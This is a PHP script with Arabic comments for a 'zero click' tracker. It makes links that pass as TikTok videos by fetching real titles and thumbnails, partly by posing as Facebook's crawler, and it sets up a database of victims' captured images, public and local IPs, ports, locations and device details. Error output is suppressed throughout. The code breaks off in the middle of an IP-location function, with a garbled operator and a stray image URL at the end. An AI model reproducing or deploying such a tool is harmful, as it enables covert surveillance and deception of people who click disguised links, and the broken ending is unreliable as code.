<?php
date_default_timezone_set('Africa/Algiers');

error_reporting(0);
@ini_set('display_errors', 0);

$upload_dir = 'uploads/';
if (!is_dir($upload_dir)) {
    @mkdir($upload_dir, 0755, true);
}

try {
    $db = new PDO('sqlite:tracker_zero_click.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // تم تعديل جدول الروابط لإزالة الحقول غير الضرورية
    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        image_data TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        location TEXT, 
        device_info TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}

// دالة لجلب معلومات تيك توك الأساسية للـ Metadata (للمعاينة عند مشاركة الرابط)
function fetch_tiktok_exclusive_meta($url) {$meta = [
        'title' => 'TikTok Video',
        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60' // صورة افتراضية
    ];

    // استدعاء واجهة oEmbed الخاصة بتيك توك
    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$oembed_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1');
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $data = json_decode($response, true);
        if (!empty($data['title'])) {
            $meta['title'] =$data['title'];
        }
        if (!empty($data['thumbnail_url'])) {
            $meta['image'] =$data['thumbnail_url'];
            return $meta;
        }
    }

    // طريقة بديلة في حال فشل الـ oEmbed
    $ch_alt = curl_init();
    curl_setopt($ch_alt, CURLOPT_URL,$url);
    curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch_alt, CURLOPT_TIMEOUT, 6);
    curl_setopt($ch_alt, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
    curl_setopt($ch_alt, CURLOPT_SSL_VERIFYPEER, false);
    $html = curl_exec($ch_alt);
    curl_close($ch_alt);

    if ($html) {$dom = new DOMDocument();
        @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
        $xpath = new DOMXPath($dom);

        $titleNodes =$xpath->query('//meta[@property="og:title"]/@content | //title');
        if ($titleNodes->length > 0) {
            $val = trim($titleNodes->item(0)->nodeValue);
            if (!empty($val)) $meta['title'] =$val;
        }

        $imageNodes =$xpath->query('//meta[@property="og:image"]/@content');
        if ($imageNodes->length > 0) {
            $val = trim($imageNodes->item(0)->nodeValue);
            if (!empty($val)) $meta['image'] =$val;
        }
    }

    return $meta;
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function get_ip_location($ip) {
    if ($ip === '127.0.0.1' || $ip === 'Unknown' \vert{}\vert{} strpos($ip, '192.168.') === 0) {
        return 'Local Network

http://googleusercontent.com/generated_image_content/0
